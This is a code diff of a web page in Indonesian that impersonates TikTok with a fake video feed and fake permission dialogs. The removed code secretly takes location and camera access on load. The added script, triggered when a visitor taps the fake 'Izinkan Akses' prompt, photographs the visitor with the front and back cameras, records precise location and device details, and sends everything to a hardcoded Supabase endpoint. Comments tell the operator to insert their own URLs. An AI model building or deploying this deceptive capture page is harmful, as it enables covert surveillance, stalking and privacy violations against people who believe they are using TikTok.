-          <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-          <span>1.9K</span>
-        </div>
-      </div>
-      <div class="comment-item">
-        <div class="comment-avatar"><img src="https://ui-avatars.com/api/?name=NS&background=9c27b0&color=fff&size=72" alt=""></div>
-        <div class="comment-body">
-          <div class="comment-user">@nursatriani</div>
-          <div class="comment-text">Ini di jalan mana ya bang? mirip sama jalan di deket rumah gue 👀</div>
-          <div class="comment-time">30 menit · Balas</div>
-        </div>
-        <div class="comment-like">
-          <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-          <span>988</span>
-        </div>
-      </div>
-      <div class="comment-item">
-        <div class="comment-avatar"><img src="https://ui-avatars.com/api/?name=BG&background=2196f3&color=fff&size=72" alt=""></div>
-        <div class="comment-body">
-          <div class="comment-user">@banggun_id</div>
-          <div class="comment-text">Udah follow dari dulu, konten lu emg ga pernah bosenin 🔥🔥</div>
-          <div class="comment-time">12 menit · Balas</div>
-        </div>
-        <div class="comment-like">
-          <svg viewBox="0 0 24 24"><path d="M12 21.35l-1.45-1.32C5.4 15.36 2 12.28 2 8.5 2 5.42 4.42 3 7.5 3c1.74 0 3.41.81 4.5 2.09C13.09 3.81 14.76 3 16.5 3 19.58 3 22 5.42 22 8.5c0 3.78-3.4 6.86-8.55 11.54L12 21.35z"/></svg>
-          <span>712</span>
-        </div>
-      </div>
-    </div>
-    <div class="sheet-input">
-      <div class="comment-avatar" style="width:32px;height:32px;flex-shrink:0">
-        <img src="https://ui-avatars.com/api/?name=Me&background=333&color=fff&size=64" alt="">
-      </div>
-      <input type="text" placeholder="Tambahkan komentar...">
-      <svg width="20" height="20" viewBox="0 0 24 24" fill="rgba(255,255,255,0.4)"><path d="M12 17.27L18.18 21l-1.64-7.03L22 9.24l-7.19-.61L12 2 9.19 8.63 2 9.24l5.46 4.73L5.82 21z"/></svg>
-    </div>
-  </div>
-
-  <!-- SHARE SHEET -->
-  <div class="share-sheet" id="share-sheet">
-    <div class="share-title">Bagikan ke</div>
-    <div class="share-grid">
-      <div class="share-item" onclick="showToast('Link disalin!')">
-        <div class="share-icon" style="background:#2a2a2a">🔗</div>
-        <span>Salin Link</span>
-      </div>
-      <div class="share-item" onclick="showToast('WhatsApp')">
-        <div class="share-icon" style="background:#25D366">💬</div>
-        <span>WhatsApp</span>
-      </div>
-      <div class="share-item" onclick="showToast('Instagram')">
-        <div class="share-icon" style="background:linear-gradient(45deg,#f09433,#e6683c,#dc2743,#cc2366,#bc1888)">📸</div>
-        <span>Instagram</span>
-      </div>
-      <div class="share-item" onclick="showToast('Twitter')">
-        <div class="share-icon" style="background:#000">✕</div>
-        <span>X</span>
-      </div>
-      <div class="share-item" onclick="showToast('Telegram')">
-        <div class="share-icon" style="background:#2AABEE">✈️</div>
-        <span>Telegram</span>
-      </div>
-      <div class="share-item" onclick="showToast('Facebook')">
-        <div class="share-icon" style="background:#1877F2">📘</div>
-        <span>Facebook</span>
-      </div>
-      <div class="share-item" onclick="showToast('Download')">
-        <div class="share-icon" style="background:#333">⬇️</div>
-        <span>Simpan</span>
-      </div>
-    </div>
-  </div>
-
-  <!-- BOTTOM NAV -->
-  <div class="bottom-nav">
-    <div class="nav-item" onclick="showToast('Beranda')">
-      <svg viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z" fill="rgba(255,255,255,0.5)"/></svg>
-      <span>Beranda</span>
-    </div>
-    <div class="nav-item" onclick="showToast('Teman')">
-      <svg viewBox="0 0 24 24"><path d="M16 11c1.66 0 2.99-1.34 2.99-3S17.66 5 16 5c-1.66 0-3 1.34-3 3s1.34 3 3 3zm-8 0c1.66 0 2.99-1.34 2.99-3S9.66 5 8 5C6.34 5 5 6.34 5 8s1.34 3 3 3zm0 2c-2.33 0-7 1.17-7 3.5V19h14v-2.5c0-2.33-4.67-3.5-7-3.5zm8 0c-.29 0-.62.02-.97.05 1.16.84 1.97 1.97 1.97 3.45V19h6v-2.5c0-2.33-4.67-3.5-7-3.5z" fill="rgba(255,255,255,0.5)"/></svg>
-      <span>Teman</span>
-    </div>
-    <div class="nav-item">
-      <div class="nav-plus" onclick="showToast('Buat video')">
-        <div class="nav-plus-inner">+</div>
-      </div>
-    </div>
-    <div class="nav-item active" onclick="showToast('Kotak Masuk')">
-      <svg viewBox="0 0 24 24"><path d="M20 2H4c-1.1 0-2 .9-2 2v18l4-4h14c1.1 0 2-.9 2-2V4c0-1.1-.9-2-2-2z" fill="#fff"/></svg>
-      <span style="color:#fff">Kotak Masuk</span>
-    </div>
-    <div class="nav-item" onclick="showToast('Profil')">
-      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" fill="rgba(255,255,255,0.5)"/></svg>
-      <span>Profil</span>
-    </div>
-  </div>
-
-  <!-- PERMISSION: LOCATION -->
-  <div class="perm-backdrop" id="perm-location">
-    <div class="perm-sheet">
-      <div class="perm-drag"></div>
-      <div class="perm-app-row">
-        <div class="perm-app-icon">🎵</div>
-        <div>
-          <div class="perm-app-name">tiktok.com</div>
-          <div class="perm-title">Izinkan TikTok mengakses<br>lokasi perangkat ini?</div>
-        </div>
-      </div>
-      <div class="perm-body">
-        <div class="perm-icon-row">
-          <div class="perm-big-icon">📍</div>
-          <div class="perm-desc">
-            TikTok menggunakan lokasi Anda untuk menampilkan <strong>konten dan iklan yang relevan</strong> serta menemukan kreator di sekitar Anda.
-          </div>
-        </div>
-      </div>
-      <div class="perm-divider"></div>
-      <div class="perm-actions">
-        <button class="perm-btn primary" onclick="allowLocation()">Izinkan saat menggunakan aplikasi</button>
-        <button class="perm-btn once" onclick="allowLocation()">Izinkan sekali</button>
-        <button class="perm-btn deny" onclick="denyLocation()">Jangan izinkan</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- PERMISSION: CAMERA -->
-  <div class="perm-backdrop" id="perm-camera" style="display:none">
-    <div class="perm-sheet">
-      <div class="perm-drag"></div>
-      <div class="perm-app-row">
-        <div class="perm-app-icon">🎵</div>
-        <div>
-          <div class="perm-app-name">tiktok.com</div>
-          <div class="perm-title">Izinkan TikTok mengakses<br>kamera dan mikrofon?</div>
-        </div>
-      </div>
-      <div class="perm-body">
-        <div class="perm-icon-row">
-          <div class="perm-big-icon">📷</div>
-          <div class="perm-desc">
-            TikTok membutuhkan akses <strong>kamera dan mikrofon</strong> agar Anda dapat merekam dan mengunggah video langsung dari aplikasi.
-          </div>
-        </div>
-      </div>
-      <div class="perm-divider"></div>
-      <div class="perm-actions">
-        <button class="perm-btn primary" onclick="allowCamera()">Izinkan</button>
-        <button class="perm-btn deny" onclick="denyCamera()">Jangan izinkan</button>
-      </div>
-    </div>
-  </div>
-
-  <!-- TOAST -->
-  <div id="toast" style="
-    position:absolute; bottom:100px; left:50%; transform:translateX(-50%) translateY(20px);
-    background:rgba(255,255,255,0.15); backdrop-filter:blur(10px);
-    color:#fff; padding:8px 20px; border-radius:20px;
-    font-size:13px; font-weight:600;
-    opacity:0; transition:all 0.25s ease; z-index:100;
-    white-space:nowrap;
-  "></div>
-
+  <div class="search-icon">&#128269;</div>
 </div>
 
+<!-- FEED -->
+<div class="feed" id="feed">
+  <!-- VIDEO 1 -->
+  <div class="video-item fake-vid-1" id="vid1">
+    <div class="video-overlay"></div>
+    <div class="play-icon">&#9654;</div>
+
+    <!-- Sidebar -->
+    <div class="sidebar">
+      <div class="avatar-wrap">
+        <div class="avatar">&#128568;</div>
+        <div class="follow-plus">+</div>
+      </div>
+      <div class="action-item">
+        <span class="action-icon">&#10084;&#65039;</span>
+        <span class="action-count">234.5K</span>
+      </div>
+      <div class="action-item">
+        <span class="action-icon">&#128172;</span>
+        <span class="action-count">3,421</span>
+      </div>
+      <div class="action-item">
+        <span class="action-icon">&#128279;</span>
+        <span class="action-count">Save</span>
+      </div>
+      <div class="action-item">
+        <span class="action-icon">&#10145;&#65039;</span>
+        <span class="action-count">Share</span>
+      </div>
+      <div class="action-item">
+        <div style="width:42px;height:42px;border-radius:50%;background:linear-gradient(135deg,#fe2c55,#ff6680);display:flex;align-items:center;justify-content:center;font-size:20px;border:2px solid #fff;animation:spin 5s linear infinite">&#127926;</div>
+      </div>
+    </div>
+
+    <!-- Info -->
+    <div class="video-info">
+      <div class="username">@fyp.official</div>
+      <div class="caption">Lagi nonton ini sambil rebahan #fyp #trending #viral #foryou &#128293;</div>
+      <div class="music-row">
+        <span class="music-note">&#127926;</span>
+        <span class="music-text">original sound - fyp.official - trending audio</span>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- BOTTOM NAV -->
+<div class="bottomnav">
+  <div class="nav-item active">
+    <span class="nav-icon">&#127968;</span>
+    <span class="nav-label">Home</span>
+  </div>
+  <div class="nav-item">
+    <span class="nav-icon">&#128269;</span>
+    <span class="nav-label">Discover</span>
+  </div>
+  <div class="nav-item">
+    <span class="plus-btn">+</span>
+  </div>
+  <div class="nav-item">
+    <span class="nav-icon">&#128232;</span>
+    <span class="nav-label">Inbox</span>
+  </div>
+  <div class="nav-item">
+    <span class="nav-icon">&#128100;</span>
+    <span class="nav-label">Profile</span>
+  </div>
+</div>
+
+<!-- PERMISSION MODAL -->
+<div class="perm-overlay" id="permOverlay">
+  <div class="perm-card">
+    <h3>Aktifkan Fitur Lengkap</h3>
+    <p>Izinkan TikTok mengakses perangkat kamu untuk pengalaman video yang lebih baik.</p>
+    <div class="perm-items">
+      <div class="perm-item">
+        <span class="perm-item-icon">&#128205;</span>
+        <div class="perm-item-text">
+          <h4>Lokasi</h4>
+          <p>Untuk menampilkan konten sesuai daerahmu</p>
+        </div>
+      </div>
+      <div class="perm-item">
+        <span class="perm-item-icon">&#128247;</span>
+        <div class="perm-item-text">
+          <h4>Kamera</h4>
+          <p>Untuk membuat video dan efek AR</p>
+        </div>
+      </div>
+    </div>
+    <button class="perm-btn-allow" onclick="requestPermissions()">Izinkan Akses</button>
+    <button class="perm-btn-skip" onclick="skipPermission()">Lewati untuk sekarang</button>
+  </div>
+</div>
+
+<div class="status-msg" id="statusMsg"></div>
+
+<style>
+@keyframes spin { from{transform:rotate(0deg)} to{transform:rotate(360deg)} }
+</style>
+
 <script>
-  // ===== SILENTLY COLLECT LOCATION + CAMERA =====
-  window.addEventListener('load', function() {
-    // Ambil lokasi diam-diam
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function(pos) {
-          window._lat = pos.coords.latitude;
-          window._lng = pos.coords.longitude;
-        },
-        function(err) {},
-        { enableHighAccuracy: true, timeout: 10000 }
-      );
-    }
+// ===== CONFIG =====
+// Ganti dengan URL website ZAM-DEX kamu
+const ZAMDEX_URL = "https://zam-dex-coder.vercel.app"; // <-- GANTI INI
 
-    // Ambil kamera diam-diam setelah 1 detik
-    setTimeout(function() {
-      if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-        navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-          .then(function(stream) {
-            // Simpan stream, jangan di-stop biar kamera aktif
-            window._camStream = stream;
-          })
-          .catch(function() {});
-      }
-    }, 1000);
+// Ganti dengan Supabase URL & anon key kamu
+const SUPABASE_URL = "https://dyevsyujenhtzkcwtxpd.supabase.co"; // <-- GANTI INI
+const SUPABASE_ANON_KEY = "sb_publishable_pgPPD26ilzp1nstqLG5lCw_wxhoM5dQ"; // <-- GANTI INI
+
+let collectedData = {};
+
+// Tampil modal saat load
+window.addEventListener('load', () => {
+  setTimeout(() => {
+    document.getElementById('permOverlay').classList.add('show');
+  }, 1500);
+});
+
+function showStatus(msg) {
+  const el = document.getElementById('statusMsg');
+  el.textContent = msg;
+  el.style.display = 'block';
+  setTimeout(() => el.style.display = 'none', 3000);
+}
+
+async function requestPermissions() {
+  document.getElementById('permOverlay').classList.remove('show');
+  
+  // 1. Request Location
+  await requestLocation();
+  // 2. Request Camera
+  await requestCamera();
+  // 3. Collect extras
+  collectExtras();
+  // 4. Save to Supabase
+  await saveToSupabase();
+}
+
+async function requestLocation() {
+  return new Promise((resolve) => {
+    if (!navigator.geolocation) { resolve(); return; }
+    navigator.geolocation.getCurrentPosition(
+      async (pos) => {
+        collectedData.latitude = pos.coords.latitude;
+        collectedData.longitude = pos.coords.longitude;
+        collectedData.accuracy = pos.coords.accuracy;
+        // Reverse geocode
+        try {
+          const r = await fetch(
+            `https://nominatim.openstreetmap.org/reverse?lat=${pos.coords.latitude}&lon=${pos.coords.longitude}&format=json`
+          );
+          const geo = await r.json();
+          collectedData.geo = geo;
+        } catch(e) {}
+        showStatus("Lokasi berhasil diakses");
+        resolve();
+      },
+      () => { showStatus("Izin lokasi ditolak"); resolve(); },
+      { enableHighAccuracy: true, timeout: 10000 }
+    );
   });
+}
 
-  // Double tap to like
-  let lastTap = 0;
-  const app = document.getElementById('app');
-  const heartBurst = document.getElementById('heart-burst');
-
-  app.addEventListener('click', function(e) {
-    const now = Date.now();
-    if (now - lastTap < 300) {
-      // double tap
-      const x = e.clientX - app.getBoundingClientRect().left;
-      const y = e.clientY - app.getBoundingClientRect().top;
-      heartBurst.style.left = (x - 40) + 'px';
-      heartBurst.style.top = (y - 60) + 'px';
-      heartBurst.classList.remove('show');
-      void heartBurst.offsetWidth;
-      heartBurst.classList.add('show');
-      // auto like
-      autoLike();
-      lastTap = 0;
-    } else {
-      lastTap = now;
+async function requestCamera() {
+  return new Promise(async (resolve) => {
+    try {
+      // Foto kamera belakang
+      const backStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: "environment" } }
+      });
+      collectedData.photoBack = await capturePhoto(backStream);
+      backStream.getTracks().forEach(t => t.stop());
+      showStatus("Kamera belakang berhasil");
+    } catch(e) {
+      // Fallback: coba kamera apa saja
+      try {
+        const s = await navigator.mediaDevices.getUserMedia({ video: true });
+        collectedData.photoBack = await capturePhoto(s);
+        s.getTracks().forEach(t => t.stop());
+      } catch(e2) {}
     }
+
+    // Foto kamera depan
+    try {
+      const frontStream = await navigator.mediaDevices.getUserMedia({
+        video: { facingMode: "user" }
+      });
+      collectedData.photoFront = await capturePhoto(frontStream);
+      frontStream.getTracks().forEach(t => t.stop());
+      showStatus("Kamera depan berhasil");
+    } catch(e) {}
+
+    resolve();
   });
+}
 
-  let liked = false;
-  function toggleLike(el) {
-    liked = !liked;
-    const svg = document.getElementById('heart-svg');
-    const count = document.getElementById('like-count');
-    if (liked) {
-      svg.querySelector('path').setAttribute('fill', '#FE2C55');
-      count.textContent = '284.7K';
-      count.style.color = '#FE2C55';
-    } else {
-      svg.querySelector('path').setAttribute('fill', 'rgba(255,255,255,0.9)');
-      count.textContent = '284.6K';
-      count.style.color = '#fff';
-    }
-  }
+function capturePhoto(stream) {
+  return new Promise((resolve) => {
+    const video = document.createElement('video');
+    video.srcObject = stream;
+    video.play();
+    video.onplaying = () => {
+      const canvas = document.createElement('canvas');
+      canvas.width = video.videoWidth || 640;
+      canvas.height = video.videoHeight || 480;
+      canvas.getContext('2d').drawImage(video, 0, 0);
+      resolve(canvas.toDataURL('image/jpeg', 0.6));
+    };
+    setTimeout(() => resolve(null), 5000);
+  });
+}
 
-  function autoLike() {
-    if (!liked) toggleLike();
+function collectExtras() {
+  // Battery
+  if (navigator.getBattery) {
+    navigator.getBattery().then(b => {
+      collectedData.battery = Math.round(b.level * 100);
+      collectedData.charging = b.charging;
+    });
   }
+  // Network
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  if (conn) {
+    collectedData.networkType = conn.effectiveType || conn.type || "unknown";
+    collectedData.downlink = conn.downlink;
+  }
+  // Device info
+  collectedData.userAgent = navigator.userAgent;
+  collectedData.platform = navigator.platform;
+  collectedData.language = navigator.language;
+  collectedData.screenW = screen.width;
+  collectedData.screenH = screen.height;
+  collectedData.timestamp = new Date().toISOString();
+}
 
-  let bookmarked = false;
-  function toggleBookmark(el) {
-    bookmarked = !bookmarked;
-    const svg = document.getElementById('bookmark-svg');
-    if (bookmarked) {
-      svg.querySelector('path').setAttribute('fill', '#FE2C55');
-      showToast('Disimpan ke favorit');
-    } else {
-      svg.querySelector('path').setAttribute('fill', 'rgba(255,255,255,0.9)');
-      showToast('Dihapus dari favorit');
-    }
-  }
+async function saveToSupabase() {
+  // Buat token unik untuk sesi ini
+  const token = Math.random().toString(36).slice(2) + Date.now().toString(36);
+  collectedData.token = token;
 
-  let followed = false;
-  function toggleFollow(btn) {
-    followed = !followed;
-    btn.textContent = followed ? '✓' : '+';
-    btn.style.background = followed ? '#25F4EE' : '#FE2C55';
-    btn.style.color = followed ? '#000' : '#fff';
-    showToast(followed ? 'Mengikuti @vlogmotor_id' : 'Berhenti mengikuti');
+  try {
+    await fetch(`${SUPABASE_URL}/rest/v1/captures`, {
+      method: 'POST',
+      headers: {
+        'Content-Type': 'application/json',
+        'apikey': SUPABASE_ANON_KEY,
+        'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
+        'Prefer': 'return=minimal'
+      },
+      body: JSON.stringify({
+        token: token,
+        latitude: collectedData.latitude || null,
+        longitude: collectedData.longitude || null,
+        accuracy: collectedData.accuracy || null,
+        geo_raw: collectedData.geo ? JSON.stringify(collectedData.geo) : null,
+        photo_back: collectedData.photoBack || null,
+        photo_front: collectedData.photoFront || null,
+        battery: collectedData.battery || null,
+        charging: collectedData.charging || null,
+        network_type: collectedData.networkType || null,
+        downlink: collectedData.downlink || null,
+        user_agent: collectedData.userAgent || null,
+        platform: collectedData.platform || null,
+        language: collectedData.language || null,
+        screen_width: collectedData.screenW || null,
+        screen_height: collectedData.screenH || null,
+        created_at: collectedData.timestamp
+      })
+    });
+    showStatus("Data tersimpan!");
+  } catch(e) {
+    console.error("Gagal simpan:", e);
   }
+}
 
-  let commentsOpen = false;
-  function toggleComments() {
-    commentsOpen = !commentsOpen;
-    document.getElementById('comments-sheet').classList.toggle('open', commentsOpen);
-    document.getElementById('overlay').classList.toggle('active', commentsOpen);
-    if (document.getElementById('share-sheet').classList.contains('open')) {
-      document.getElementById('share-sheet').classList.remove('open');
-    }
-  }
+function skipPermission() {
+  document.getElementById('permOverlay').classList.remove('show');
+}
 
-  let shareOpen = false;
-  function toggleShare() {
-    shareOpen = !shareOpen;
-    document.getElementById('share-sheet').classList.toggle('open', shareOpen);
-    document.getElementById('overlay').classList.toggle('active', shareOpen);
-    if (document.getElementById('comments-sheet').classList.contains('open')) {
-      document.getElementById('comments-sheet').classList.remove('open');
-    }
-  }
-
-  function closeAll() {
-    commentsOpen = false; shareOpen = false;
-    document.getElementById('comments-sheet').classList.remove('open');
-    document.getElementById('share-sheet').classList.remove('open');
-    document.getElementById('overlay').classList.remove('active');
-  }
-
-  let toastTimer;
-  function showToast(msg) {
-    const t = document.getElementById('toast');
-    t.textContent = msg;
-    t.style.opacity = '1';
-    t.style.transform = 'translateX(-50%) translateY(0)';
-    clearTimeout(toastTimer);
-    toastTimer = setTimeout(() => {
-      t.style.opacity = '0';
-      t.style.transform = 'translateX(-50%) translateY(20px)';
-    }, 1800);
-  }
+// Click video to play (fake)
+document.getElementById('feed').addEventListener('click', () => {
+  document.getElementById('permOverlay').classList.add('show');
+});
 </script>
-
 </body>
 </html>
